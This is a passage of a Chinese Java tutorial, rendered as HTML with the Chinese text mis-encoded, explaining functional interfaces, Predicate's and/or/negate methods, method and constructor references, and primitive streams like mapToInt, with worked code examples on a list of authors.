href="#51-æ¦‚è¿°"></a> 5.1 æ¦‚è¿°</h3><p>â€‹<strong>åªæœ‰ä¸€ä¸ªæŠ½è±¡æ–¹æ³•</strong>çš„æ¥å£æˆ‘ä»¬ç§°ä¹‹ä¸ºå‡½æ•°æ¥å£ã€‚</p><p>â€‹JDKçš„å‡½æ•°å¼æ¥å£éƒ½åŠ ä¸Šäº†**@FunctionalInterface** æ³¨è§£è¿›è¡Œæ ‡è¯†ã€‚ä½†æ˜¯æ— è®ºæ˜¯å¦åŠ ä¸Šè¯¥æ³¨è§£åªè¦æ¥å£ä¸­åªæœ‰ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œéƒ½æ˜¯å‡½æ•°å¼æ¥å£ã€‚</p><h3 id="52-å¸¸è§å‡½æ•°å¼æ¥å£"><a class="markdownIt-Anchor" href="#52-å¸¸è§å‡½æ•°å¼æ¥å£"></a> 5.2 å¸¸è§å‡½æ•°å¼æ¥å£</h3><ul><li><p>â€‹Consumer æ¶ˆè´¹æ¥å£</p><p>æ ¹æ®å…¶ä¸­æŠ½è±¡æ–¹æ³•çš„å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼ç±»å‹çŸ¥é“ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ–¹æ³•ä¸­å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œæ¶ˆè´¹ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20211028145622163-16354041894551.png" alt="image-20211028145622163" /></p></li><li><p>â€‹Function è®¡ç®—è½¬æ¢æ¥å£</p><p>æ ¹æ®å…¶ä¸­æŠ½è±¡æ–¹æ³•çš„å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼ç±»å‹çŸ¥é“ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ–¹æ³•ä¸­å¯¹ä¼ å…¥çš„å‚æ•°è®¡ç®—æˆ–è½¬æ¢ï¼ŒæŠŠç»“æœè¿”å›</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20211028145707862-16354042291112.png" alt="image-20211028145707862" /></p></li><li><p>â€‹Predicate åˆ¤æ–­æ¥å£</p><p>æ ¹æ®å…¶ä¸­æŠ½è±¡æ–¹æ³•çš„å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼ç±»å‹çŸ¥é“ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ–¹æ³•ä¸­å¯¹ä¼ å…¥çš„å‚æ•°æ¡ä»¶åˆ¤æ–­ï¼Œè¿”å›åˆ¤æ–­ç»“æœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20211028145818743-16354043004393.png" alt="image-20211028145818743" /></p></li><li><p>â€‹Supplier ç”Ÿäº§å‹æ¥å£</p><p>æ ¹æ®å…¶ä¸­æŠ½è±¡æ–¹æ³•çš„å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼ç±»å‹çŸ¥é“ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ–¹æ³•ä¸­åˆ›å»ºå¯¹è±¡ï¼ŒæŠŠåˆ›å»ºå¥½çš„å¯¹è±¡è¿”å›</p></li></ul><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20211028145843368-16354043246954.png" alt="image-20211028145843368" /></p><h3 id="53-å¸¸ç”¨çš„é»˜è®¤æ–¹æ³•"><a class="markdownIt-Anchor" href="#53-å¸¸ç”¨çš„é»˜è®¤æ–¹æ³•"></a> 5.3 å¸¸ç”¨çš„é»˜è®¤æ–¹æ³•</h3><ul><li><p>and</p><p>æˆ‘ä»¬åœ¨ä½¿ç”¨Predicateæ¥å£æ—¶å€™å¯èƒ½éœ€è¦è¿›è¡Œåˆ¤æ–­æ¡ä»¶çš„æ‹¼æ¥ã€‚è€Œandæ–¹æ³•ç›¸å½“äºæ˜¯ä½¿ç”¨&amp;&amp;æ¥æ‹¼æ¥ä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶</p><p>ä¾‹å¦‚ï¼š</p><p>æ‰“å°ä½œå®¶ä¸­å¹´é¾„å¤§äº17å¹¶ä¸”å§“åçš„é•¿åº¦å¤§äº1çš„ä½œå®¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>Stream&lt;Author&gt; authorStream = authors.stream();<br>authorStream.filter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;<br>        <span class="hljs-keyword">return</span> author.getAge()&gt;<span class="hljs-number">17</span>;<br>    &#125;<br>&#125;.and(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;<br>        <span class="hljs-keyword">return</span> author.getName().length()&gt;<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;)).forEach(author -&gt; System.out.println(author));<br></code></pre></td></tr></table></figure></li><li><p>or</p><p>æˆ‘ä»¬åœ¨ä½¿ç”¨Predicateæ¥å£æ—¶å€™å¯èƒ½éœ€è¦è¿›è¡Œåˆ¤æ–­æ¡ä»¶çš„æ‹¼æ¥ã€‚è€Œoræ–¹æ³•ç›¸å½“äºæ˜¯ä½¿ç”¨||æ¥æ‹¼æ¥ä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>æ‰“å°ä½œå®¶ä¸­å¹´é¾„å¤§äº17æˆ–è€…å§“åçš„é•¿åº¦å°äº2çš„ä½œå®¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        æ‰“å°ä½œå®¶ä¸­å¹´é¾„å¤§äº17æˆ–è€…å§“åçš„é•¿åº¦å°äº2çš„ä½œå®¶ã€‚</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        authors.stream()<br>                .filter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;<br>                        <span class="hljs-keyword">return</span> author.getAge()&gt;<span class="hljs-number">17</span>;<br>                    &#125;<br>                &#125;.or(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;<br>                        <span class="hljs-keyword">return</span> author.getName().length()&lt;<span class="hljs-number">2</span>;<br>                    &#125;<br>                &#125;)).forEach(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure></li><li><p>negate</p><p>Predicateæ¥å£ä¸­çš„æ–¹æ³•ã€‚negateæ–¹æ³•ç›¸å½“äºæ˜¯åœ¨åˆ¤æ–­æ·»åŠ å‰é¢åŠ äº†ä¸ª! è¡¨ç¤ºå–å</p><p>ä¾‹å¦‚ï¼š</p><p>æ‰“å°ä½œå®¶ä¸­å¹´é¾„ä¸å¤§äº17çš„ä½œå®¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        æ‰“å°ä½œå®¶ä¸­å¹´é¾„ä¸å¤§äº17çš„ä½œå®¶ã€‚</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        authors.stream()<br>                .filter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Predicate</span>&lt;Author&gt;() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Author author)</span> &#123;<br>                        <span class="hljs-keyword">return</span> author.getAge()&gt;<span class="hljs-number">17</span>;<br>                    &#125;<br>                &#125;.negate()).forEach(author -&gt; System.out.println(author.getAge()));<br></code></pre></td></tr></table></figure></li></ul><h2 id="6-æ–¹æ³•å¼•ç”¨"><a class="markdownIt-Anchor" href="#6-æ–¹æ³•å¼•ç”¨"></a> 6. æ–¹æ³•å¼•ç”¨</h2><p>â€‹æˆ‘ä»¬åœ¨ä½¿ç”¨lambdaæ—¶ï¼Œå¦‚æœæ–¹æ³•ä½“ä¸­åªæœ‰ä¸€ä¸ªæ–¹æ³•çš„è°ƒç”¨çš„è¯ï¼ˆåŒ…æ‹¬æ„é€ æ–¹æ³•ï¼‰,æˆ‘ä»¬å¯ä»¥ç”¨æ–¹æ³•å¼•ç”¨è¿›ä¸€æ­¥ç®€åŒ–ä»£ç ã€‚</p><h3 id="61-æ¨èç”¨æ³•"><a class="markdownIt-Anchor" href="#61-æ¨èç”¨æ³•"></a> 6.1 æ¨èç”¨æ³•</h3><p>â€‹æˆ‘ä»¬åœ¨ä½¿ç”¨lambdaæ—¶ä¸éœ€è¦è€ƒè™‘ä»€ä¹ˆæ—¶å€™ç”¨æ–¹æ³•å¼•ç”¨ï¼Œç”¨å“ªç§æ–¹æ³•å¼•ç”¨ï¼Œæ–¹æ³•å¼•ç”¨çš„æ ¼å¼æ˜¯ä»€ä¹ˆã€‚æˆ‘ä»¬åªéœ€è¦åœ¨å†™å®Œlambdaæ–¹æ³•å‘ç°æ–¹æ³•ä½“åªæœ‰ä¸€è¡Œä»£ç ï¼Œå¹¶ä¸”æ˜¯æ–¹æ³•çš„è°ƒç”¨æ—¶ä½¿ç”¨å¿«æ·é”®å°è¯•æ˜¯å¦èƒ½å¤Ÿè½¬æ¢æˆæ–¹æ³•å¼•ç”¨å³å¯ã€‚</p><p>â€‹å½“æˆ‘ä»¬æ–¹æ³•å¼•ç”¨ä½¿ç”¨çš„å¤šäº†æ…¢æ…¢çš„ä¹Ÿå¯ä»¥ç›´æ¥å†™å‡ºæ–¹æ³•å¼•ç”¨ã€‚</p><h3 id="62-åŸºæœ¬æ ¼å¼"><a class="markdownIt-Anchor" href="#62-åŸºæœ¬æ ¼å¼"></a> 6.2 åŸºæœ¬æ ¼å¼</h3><p>â€‹ç±»åæˆ–è€…å¯¹è±¡å::æ–¹æ³•å</p><h3 id="63-è¯­æ³•è¯¦è§£äº†è§£"><a class="markdownIt-Anchor" href="#63-è¯­æ³•è¯¦è§£äº†è§£"></a> 6.3 è¯­æ³•è¯¦è§£(äº†è§£)</h3><h4 id="631-å¼•ç”¨ç±»çš„é™æ€æ–¹æ³•"><a class="markdownIt-Anchor" href="#631-å¼•ç”¨ç±»çš„é™æ€æ–¹æ³•"></a> 6.3.1 å¼•ç”¨ç±»çš„é™æ€æ–¹æ³•</h4><p>â€‹å…¶å®å°±æ˜¯å¼•ç”¨ç±»çš„é™æ€æ–¹æ³•</p><h5 id="æ ¼å¼"><a class="markdownIt-Anchor" href="#æ ¼å¼"></a> æ ¼å¼</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ç±»å::æ–¹æ³•å<br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨å‰æ"><a class="markdownIt-Anchor" href="#ä½¿ç”¨å‰æ"></a> ä½¿ç”¨å‰æ</h5><p>â€‹å¦‚æœæˆ‘ä»¬åœ¨é‡å†™æ–¹æ³•çš„æ—¶å€™ï¼Œæ–¹æ³•ä½“ä¸­<strong>åªæœ‰ä¸€è¡Œä»£ç </strong>ï¼Œå¹¶ä¸”è¿™è¡Œä»£ç æ˜¯<strong>è°ƒç”¨äº†æŸä¸ªç±»çš„é™æ€æ–¹æ³•</strong>ï¼Œå¹¶ä¸”æˆ‘ä»¬æŠŠè¦é‡å†™çš„<strong>æŠ½è±¡æ–¹æ³•ä¸­æ‰€æœ‰çš„å‚æ•°éƒ½æŒ‰ç…§é¡ºåºä¼ å…¥äº†è¿™ä¸ªé™æ€æ–¹æ³•ä¸­</strong>ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å¼•ç”¨ç±»çš„é™æ€æ–¹æ³•ã€‚</p><p>â€‹</p><p>ä¾‹å¦‚ï¼š</p><p>å¦‚ä¸‹ä»£ç å°±å¯ä»¥ç”¨æ–¹æ³•å¼•ç”¨è¿›è¡Œç®€åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br><br>Stream&lt;Author&gt; authorStream = authors.stream();<br><br>authorStream.map(author -&gt; author.getAge())<br>        .map(age-&gt;String.valueOf(age));<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œå¦‚æœæˆ‘ä»¬æ‰€é‡å†™çš„æ–¹æ³•æ˜¯æ²¡æœ‰å‚æ•°çš„ï¼Œè°ƒç”¨çš„æ–¹æ³•ä¹Ÿæ˜¯æ²¡æœ‰å‚æ•°çš„ä¹Ÿç›¸å½“äºç¬¦åˆä»¥ä¸Šè§„åˆ™ã€‚</p><p>ä¼˜åŒ–åå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br><br>Stream&lt;Author&gt; authorStream = authors.stream();<br><br>authorStream.map(author -&gt; author.getAge())<br>        .map(String::valueOf);<br></code></pre></td></tr></table></figure><h4 id="632-å¼•ç”¨å¯¹è±¡çš„å®ä¾‹æ–¹æ³•"><a class="markdownIt-Anchor" href="#632-å¼•ç”¨å¯¹è±¡çš„å®ä¾‹æ–¹æ³•"></a> 6.3.2 å¼•ç”¨å¯¹è±¡çš„å®ä¾‹æ–¹æ³•</h4><h5 id="æ ¼å¼-2"><a class="markdownIt-Anchor" href="#æ ¼å¼-2"></a> æ ¼å¼</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">å¯¹è±¡å::æ–¹æ³•å<br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨å‰æ-2"><a class="markdownIt-Anchor" href="#ä½¿ç”¨å‰æ-2"></a> ä½¿ç”¨å‰æ</h5><p>â€‹å¦‚æœæˆ‘ä»¬åœ¨é‡å†™æ–¹æ³•çš„æ—¶å€™ï¼Œæ–¹æ³•ä½“ä¸­<strong>åªæœ‰ä¸€è¡Œä»£ç </strong>ï¼Œå¹¶ä¸”è¿™è¡Œä»£ç æ˜¯<strong>è°ƒç”¨äº†æŸä¸ªå¯¹è±¡çš„æˆå‘˜æ–¹æ³•</strong>ï¼Œå¹¶ä¸”æˆ‘ä»¬æŠŠè¦é‡å†™çš„<strong>æŠ½è±¡æ–¹æ³•ä¸­æ‰€æœ‰çš„å‚æ•°éƒ½æŒ‰ç…§é¡ºåºä¼ å…¥äº†è¿™ä¸ªæˆå‘˜æ–¹æ³•ä¸­</strong>ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å¼•ç”¨å¯¹è±¡çš„å®ä¾‹æ–¹æ³•</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br><br>Stream&lt;Author&gt; authorStream = authors.stream();<br><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>authorStream.map(author -&gt; author.getName())<br>        .forEach(name-&gt;sb.append(name));<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–åï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br><br>Stream&lt;Author&gt; authorStream = authors.stream();<br><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>authorStream.map(author -&gt; author.getName())<br>        .forEach(sb::append);<br></code></pre></td></tr></table></figure><h4 id="634-å¼•ç”¨ç±»çš„å®ä¾‹æ–¹æ³•"><a class="markdownIt-Anchor" href="#634-å¼•ç”¨ç±»çš„å®ä¾‹æ–¹æ³•"></a> 6.3.4 å¼•ç”¨ç±»çš„å®ä¾‹æ–¹æ³•</h4><h5 id="æ ¼å¼-3"><a class="markdownIt-Anchor" href="#æ ¼å¼-3"></a> æ ¼å¼</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ç±»å::æ–¹æ³•å<br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨å‰æ-3"><a class="markdownIt-Anchor" href="#ä½¿ç”¨å‰æ-3"></a> ä½¿ç”¨å‰æ</h5><p>â€‹å¦‚æœæˆ‘ä»¬åœ¨é‡å†™æ–¹æ³•çš„æ—¶å€™ï¼Œæ–¹æ³•ä½“ä¸­<strong>åªæœ‰ä¸€è¡Œä»£ç </strong>ï¼Œå¹¶ä¸”è¿™è¡Œä»£ç æ˜¯<strong>è°ƒç”¨äº†ç¬¬ä¸€ä¸ªå‚æ•°çš„æˆå‘˜æ–¹æ³•</strong>ï¼Œå¹¶ä¸”æˆ‘ä»¬æŠŠè¦<strong>é‡å†™çš„æŠ½è±¡æ–¹æ³•ä¸­å‰©ä½™çš„æ‰€æœ‰çš„å‚æ•°éƒ½æŒ‰ç…§é¡ºåºä¼ å…¥äº†è¿™ä¸ªæˆå‘˜æ–¹æ³•ä¸­</strong>ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å¼•ç”¨ç±»çš„å®ä¾‹æ–¹æ³•ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UseString</span>&#123;<br>       String <span class="hljs-title function_">use</span><span class="hljs-params">(String str,<span class="hljs-type">int</span> start,<span class="hljs-type">int</span> length)</span>;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">subAuthorName</span><span class="hljs-params">(String str, UseString useString)</span>&#123;<br>       <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>       <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>       <span class="hljs-keyword">return</span> useString.use(str,start,length);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>       subAuthorName(<span class="hljs-string">&quot;ä¸‰æ›´è‰å ‚&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UseString</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>           <span class="hljs-keyword">public</span> String <span class="hljs-title function_">use</span><span class="hljs-params">(String str, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> length)</span> &#123;<br>               <span class="hljs-keyword">return</span> str.substring(start,length);<br>           &#125;<br>       &#125;);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–åå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    subAuthorName(<span class="hljs-string">&quot;ä¸‰æ›´è‰å ‚&quot;</span>, String::substring);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="635-æ„é€ å™¨å¼•ç”¨"><a class="markdownIt-Anchor" href="#635-æ„é€ å™¨å¼•ç”¨"></a> 6.3.5 æ„é€ å™¨å¼•ç”¨</h4><p>â€‹å¦‚æœæ–¹æ³•ä½“ä¸­çš„ä¸€è¡Œä»£ç æ˜¯æ„é€ å™¨çš„è¯å°±å¯ä»¥ä½¿ç”¨æ„é€ å™¨å¼•ç”¨ã€‚</p><h5 id="æ ¼å¼-4"><a class="markdownIt-Anchor" href="#æ ¼å¼-4"></a> æ ¼å¼</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ç±»å::<span class="hljs-keyword">new</span><br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨å‰æ-4"><a class="markdownIt-Anchor" href="#ä½¿ç”¨å‰æ-4"></a> ä½¿ç”¨å‰æ</h5><p>â€‹å¦‚æœæˆ‘ä»¬åœ¨é‡å†™æ–¹æ³•çš„æ—¶å€™ï¼Œæ–¹æ³•ä½“ä¸­<strong>åªæœ‰ä¸€è¡Œä»£ç </strong>ï¼Œå¹¶ä¸”è¿™è¡Œä»£ç æ˜¯<strong>è°ƒç”¨äº†æŸä¸ªç±»çš„æ„é€ æ–¹æ³•</strong>ï¼Œå¹¶ä¸”æˆ‘ä»¬æŠŠ<strong>è¦é‡å†™çš„æŠ½è±¡æ–¹æ³•ä¸­çš„æ‰€æœ‰çš„å‚æ•°éƒ½æŒ‰ç…§é¡ºåºä¼ å…¥äº†è¿™ä¸ªæ„é€ æ–¹æ³•ä¸­</strong>ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å¼•ç”¨æ„é€ å™¨ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.stream()<br>        .map(author -&gt; author.getName())<br>        .map(name-&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(name))<br>        .map(sb-&gt;sb.append(<span class="hljs-string">&quot;-ä¸‰æ›´&quot;</span>).toString())<br>        .forEach(str-&gt; System.out.println(str));<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–åï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.stream()<br>        .map(author -&gt; author.getName())<br>        .map(StringBuilder::<span class="hljs-keyword">new</span>)<br>        .map(sb-&gt;sb.append(<span class="hljs-string">&quot;-ä¸‰æ›´&quot;</span>).toString())<br>        .forEach(str-&gt; System.out.println(str));<br></code></pre></td></tr></table></figure><h2 id="7-é«˜çº§ç”¨æ³•"><a class="markdownIt-Anchor" href="#7-é«˜çº§ç”¨æ³•"></a> 7. é«˜çº§ç”¨æ³•</h2><h3 id="åŸºæœ¬æ•°æ®ç±»å‹ä¼˜åŒ–"><a class="markdownIt-Anchor" href="#åŸºæœ¬æ•°æ®ç±»å‹ä¼˜åŒ–"></a> åŸºæœ¬æ•°æ®ç±»å‹ä¼˜åŒ–</h3><p>â€‹æˆ‘ä»¬ä¹‹å‰ç”¨åˆ°çš„å¾ˆå¤šStreamçš„æ–¹æ³•ç”±äºéƒ½ä½¿ç”¨äº†æ³›å‹ã€‚æ‰€ä»¥æ¶‰åŠåˆ°çš„å‚æ•°å’Œè¿”å›å€¼éƒ½æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ã€‚</p><p>â€‹å³ä½¿æˆ‘ä»¬æ“ä½œçš„æ˜¯æ•´æ•°å°æ•°ï¼Œä½†æ˜¯å®é™…ç”¨çš„éƒ½æ˜¯ä»–ä»¬çš„åŒ…è£…ç±»ã€‚JDK5ä¸­å¼•å…¥çš„è‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±è®©æˆ‘ä»¬åœ¨ä½¿ç”¨å¯¹åº”çš„åŒ…è£…ç±»æ—¶å°±å¥½åƒä½¿ç”¨åŸºæœ¬æ•°æ®ç±»å‹ä¸€æ ·æ–¹ä¾¿ã€‚ä½†æ˜¯ä½ ä¸€å®šè¦çŸ¥é“è£…ç®±å’Œæ‹†ç®±è‚¯å®šæ˜¯è¦æ¶ˆè€—æ—¶é—´çš„ã€‚è™½ç„¶è¿™ä¸ªæ—¶é—´æ¶ˆè€—å¾ˆä¸‹ã€‚ä½†æ˜¯åœ¨å¤§é‡çš„æ•°æ®ä¸æ–­çš„é‡å¤è£…ç®±æ‹†ç®±çš„æ—¶å€™ï¼Œä½ å°±ä¸èƒ½æ— è§†è¿™ä¸ªæ—¶é—´æŸè€—äº†ã€‚</p><p>â€‹æ‰€ä»¥ä¸ºäº†è®©æˆ‘ä»¬èƒ½å¤Ÿå¯¹è¿™éƒ¨åˆ†çš„æ—¶é—´æ¶ˆè€—è¿›è¡Œä¼˜åŒ–ã€‚Streamè¿˜æä¾›äº†å¾ˆå¤šä¸“é—¨é’ˆå¯¹åŸºæœ¬æ•°æ®ç±»å‹çš„æ–¹æ³•ã€‚</p><p>â€‹ä¾‹å¦‚ï¼šmapToInt,mapToLong,mapToDouble,flatMapToInt,flatMapToDoubleç­‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test27</span><span class="hljs-params">()</span> &#123;<br><br>    List&lt;Author&gt; authors = getAuthors();<br>    authors.stream()<br>            .map(author -&gt; author.getAge())<br>            .map(age -&gt; age + <span class="hljs-number">10</span>)<br>            .filter(age-&gt;age&gt;<span class="hljs-number">18</span>)<br>            .map(age-&gt;age+<span class="hljs-number">2</span>)<br>            .forEach(System.out::println);<br><br>    authors.stream()<br>            .mapToInt(author -&gt; author.getAge())<br>            .map(age -&gt; age + <span class="hljs-number">10</span>)<br>            .filter(age-&gt;age&gt;<span class="hljs-number">18</span>)<br>            .map(age-&gt;age+<span class="hljs-number">2</span>)<br>            .forEach(System.out::println);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¹¶è¡Œæµ"><a class="markdownIt-Anchor" href="#å¹¶è¡Œæµ"></a> å¹¶è¡Œæµ</h3><p>â€‹å½“æµä¸­æœ‰å¤§é‡å…ƒç´ æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¹¶è¡Œæµå»æé«˜æ“ä½œçš„æ•ˆç‡ã€‚å…¶å®å¹¶è¡Œæµå°±æ˜¯æŠŠä»»åŠ¡åˆ†é…ç»™å¤šä¸ªçº¿ç¨‹å»å®Œå…¨ã€‚å¦‚æœæˆ‘ä»¬è‡ªå·±å»ç”¨ä»£ç 